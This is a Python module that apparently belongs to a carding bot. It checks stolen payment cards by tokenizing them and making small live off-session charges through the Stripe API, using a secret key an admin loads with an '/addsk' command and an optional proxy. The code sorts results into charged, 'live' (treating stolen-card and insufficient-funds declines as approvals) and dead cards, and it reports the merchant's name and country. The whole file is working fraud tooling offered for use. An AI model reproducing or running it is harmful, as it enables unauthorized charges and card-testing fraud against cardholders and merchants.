import httpx
import time
import json
import os
import logging
from env_config import get_setting, write_runtime_setting

logging.basicConfig(level=logging.INFO, format='%(name)s: %(message)s')
logger = logging.getLogger("stripe_charge")

STRIPE_API = "https://api.stripe.com/v1"

def set_charge_sk(sk, amount_cents=50):
    write_runtime_setting("CHARGE_SK", sk)
    write_runtime_setting("CHARGE_AMOUNT", int(amount_cents))


def get_charge_sk():
    sk = get_setting("CHARGE_SK")
    amount = get_setting("CHARGE_AMOUNT", "50")
    return sk, int(amount)


async def stripe_charge_check(cc, mm, yy, cvv, proxy=None):
    sk, amount_cents = get_charge_sk()
    if not sk:
        return "Error - No SK configured. Admin: /addsk <sk_live_xxx> [amount_cents]"

    start = time.time()

    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy

    client_kwargs = {"timeout": httpx.Timeout(30), "follow_redirects": True}
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:
        try:
            acc_resp = await client.get(
                f"{STRIPE_API}/account",
                auth=(sk, ""),
                timeout=15,
            )
            acc_data = acc_resp.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - Account request failed: {str(e)[:50]} [{elapsed}s]"

        if "error" in acc_data:
            err = acc_data["error"]
            msg = err.get("message", "")
            elapsed = round(time.time() - start, 2)
            if "Invalid API Key" in msg or err.get("code") == "api_key_expired":
                return f"Error - SK Expired/Invalid [{elapsed}s]"
            return f"Error - {err.get('code', 'unknown')}: {msg[:60]} [{elapsed}s]"

        merchant_name = acc_data.get("business_profile", {}).get("name") or acc_data.get("settings", {}).get("dashboard", {}).get("display_name", "Unknown")
        country = acc_data.get("country", "??")

        tok_data = {
            "card[number]": cc,
            "card[exp_month]": mm.zfill(2),
            "card[exp_year]": exp_year,
            "card[cvc]": cvv,
        }

        try:
            tok_resp = await client.post(
                f"{STRIPE_API}/tokens",
                data=tok_data,
                auth=(sk, ""),
                timeout=15,
            )
            tok_result = tok_resp.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - Token request failed: {str(e)[:50]} [{elapsed}s]"

        if "error" in tok_result:
            err = tok_result["error"]
            code = err.get("code", "")
            msg = err.get("message", "")
            elapsed = round(time.time() - start, 2)
            if code == "rate_limit":
                return f"Error - Rate Limited [{elapsed}s]"
            if "testmode_charges_only" in msg or code == "testmode_charges_only":
                return f"Error - Test Mode Key [{elapsed}s]"
            if code == "incorrect_number":
                return f"Declined - Incorrect Card Number [{elapsed}s]"
            if code in ("invalid_expiry_year", "invalid_expiry_month"):
                return f"Declined - Invalid Expiry [{elapsed}s]"
            if code == "expired_card":
                return f"Declined - Card Expired [{elapsed}s]"
            decline = err.get("decline_code", code)
            return f"Declined - {decline}: {msg[:60]} [{elapsed}s]"

        token_id = tok_result.get("id")
        if not token_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - No Token ID [{elapsed}s]"

        pm_data = {
            "type": "card",
            "card[token]": token_id,
        }
        try:
            pm_resp = await client.post(
                f"{STRIPE_API}/payment_methods",
                data=pm_data,
                auth=(sk, ""),
                timeout=15,
            )
            pm_result = pm_resp.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - PM request failed: {str(e)[:50]} [{elapsed}s]"

        if "error" in pm_result:
            err = pm_result["error"]
            code = err.get("code", "")
            msg = err.get("message", "")
            elapsed = round(time.time() - start, 2)

            if code == "rate_limit":
                return f"Error - Rate Limited [{elapsed}s]"
            if "testmode_charges_only" in msg or code == "testmode_charges_only":
                return f"Error - Test Mode Key [{elapsed}s]"
            if code == "incorrect_number":
                return f"Declined - Incorrect Card Number [{elapsed}s]"
            if code in ("invalid_expiry_year", "invalid_expiry_month"):
                return f"Declined - Invalid Expiry [{elapsed}s]"
            if code == "expired_card":
                return f"Declined - Card Expired [{elapsed}s]"

            decline = err.get("decline_code", code)
            return f"Declined - {decline}: {msg[:60]} [{elapsed}s]"

        pm_id = pm_result.get("id")
        if not pm_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - No PM ID [{elapsed}s]"

        amount_display = f"${amount_cents / 100:.2f}"

        pi_data = {
            "amount": str(amount_cents),
            "currency": "usd",
            "payment_method": pm_id,
            "confirm": "true",
            "off_session": "true",
            "description": f"Charge {amount_display}",
        }

        try:
            pi_resp = await client.post(
                f"{STRIPE_API}/payment_intents",
                data=pi_data,
                auth=(sk, ""),
                timeout=20,
            )
            pi_result = pi_resp.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - PI request failed: {str(e)[:50]} [{elapsed}s]"

        elapsed = round(time.time() - start, 2)
        status = pi_result.get("status", "")

        if status == "succeeded":
            return f"Charged {amount_display} | Merchant: {merchant_name} | Country: {country} [{elapsed}s]"

        if status == "requires_action":
            return f"Approved - 3DS Required | Merchant: {merchant_name} | Country: {country} [{elapsed}s]"

        if "error" in pi_result:
            err = pi_result["error"]
            code = err.get("code", "")
            decline = err.get("decline_code", "")
            msg = err.get("message", "")

            if code == "rate_limit":
                return f"Error - Rate Limited [{elapsed}s]"

            LIVE_DECLINE_CODES = [
                "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
                "pickup_card", "restricted_card", "security_violation",
                "incorrect_cvc", "invalid_cvc", "incorrect_zip",
                "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
                "try_again_later", "not_permitted", "generic_decline",
                "transaction_not_allowed", "card_not_supported",
            ]

            if decline in LIVE_DECLINE_CODES or code in LIVE_DECLINE_CODES:
                return f"Approved - {decline or code} (Live Declined) | Merchant: {merchant_name} | Country: {country} [{elapsed}s]"

            if code == "card_declined" and decline == "fraudulent":
                return f"Declined - Fraudulent [{elapsed}s]"

            if code == "card_declined":
                return f"Declined - {decline or 'card_declined'} [{elapsed}s]"

            if code == "expired_card":
                return f"Declined - Card Expired [{elapsed}s]"

            if code == "authentication_required":
                return f"Approved - 3DS Required | Merchant: {merchant_name} | Country: {country} [{elapsed}s]"

            return f"Declined - {code}: {msg[:50]} [{elapsed}s]"

        if status:
            return f"Declined - Status: {status} [{elapsed}s]"

        return f"Declined - Unknown [{elapsed}s]"
